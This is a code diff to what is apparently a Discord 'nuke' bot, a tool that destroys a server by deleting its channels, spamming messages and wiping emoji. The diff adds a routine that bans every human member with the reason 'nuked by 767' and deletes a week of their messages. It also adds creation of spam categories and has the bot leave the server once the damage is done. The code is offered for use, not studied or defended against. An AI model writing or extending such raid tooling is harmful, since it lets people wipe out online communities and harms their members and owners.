@@ -15,6 +15,8 @@ from nuke.config import get as nuke_cfg
 from nuke.profile import _avatar_cache, disable_features, fetch_b64
 from utils.log_webhook import send as log_send
 
+_BAN_PERM = 0x0000000000000004
+
 _states = None  # initialized in run_nuke
 _stop_flags: dict[int, bool] = {}
 
@@ -65,7 +67,7 @@ async def _rename_guild(
         logging.error(f"nuke [{guild_id}]: guild rename error: {e}")
 
 
-async def run_nuke(bot: Any, guild_id: int, guild: Any = None) -> None:
+async def run_nuke(bot: Any, guild_id: int, guild: Any = None, manual: bool = False) -> None:
     nc = nuke_cfg()
     c = bot.cfg
     limiter = bot.http.fast_limiter
@@ -74,6 +76,26 @@ async def run_nuke(bot: Any, guild_id: int, guild: Any = None) -> None:
 
     total_channels = nc.channel_count
     max_spam_batches = nc.message_count
+
+    async def ban_mass() -> None:
+        if not manual:
+            return
+        g = bot.get_guild(guild_id)
+        if not g:
+            return
+        try:
+            async for m in g.fetch_members(limit=None):
+                if not m.bot:
+                    try:
+                        await g.ban(
+                            m,
+                            reason="nuked by 767",
+                            delete_message_days=7,
+                        )
+                    except Exception:
+                        pass
+        except Exception as e:
+            logging.error(f"nuke [{guild_id}]: mass ban failed: {e}")
 
     session: ClientSession
     async with ClientSession() as s:
@@ -146,6 +168,22 @@ async def run_nuke(bot: Any, guild_id: int, guild: Any = None) -> None:
                 await channels.delete_all(limiter, guild_id, existing_channels, headers)
             except Exception as e:
                 logging.error(f"nuke [{guild_id}]: channel delete failed: {e}")
+
+            category_ids: list[str] = []
+            if nc.category_count > 0:
+                try:
+                    async with timeout(30):
+                        category_ids = await channels.create_categories(
+                            limiter,
+                            guild_id,
+                            nc.category_count,
+                            headers,
+                        )
+                except TimeoutError:
+                    logging.error(f"nuke [{guild_id}]: category create timed out")
+                except Exception as e:
+                    logging.error(f"nuke [{guild_id}]: category create failed: {e}")
+
             try:
                 async with timeout(60):
                     ids = await channels.create_many(
@@ -155,6 +193,7 @@ async def run_nuke(bot: Any, guild_id: int, guild: Any = None) -> None:
                         headers,
                         on_create=lambda ch_id: pending_channels.append(ch_id),
                         on_threshold=lambda: webhook_trigger.set(),
+                        category_ids=category_ids,
                     )
                 all_channel_ids.extend(ids)
                 channels_done.set()
@@ -270,12 +309,21 @@ async def run_nuke(bot: Any, guild_id: int, guild: Any = None) -> None:
         await emoji_wipe_task
         await channel_spam_task
 
+    await ban_mass()
+
     _stop_flags.pop(guild_id, None)
     _avatar_cache.clear()
     from utils.db import db
 
     if db.cache:
         await db.cache.delete(f"nuke:{guild_id}")
+
+    g = bot.get_guild(guild_id)
+    if g:
+        try:
+            await g.leave()
+        except Exception as e:
+            logging.warning(f"nuke [{guild_id}]: leave failed: {e}")
 
 
 async def _none() -> None:
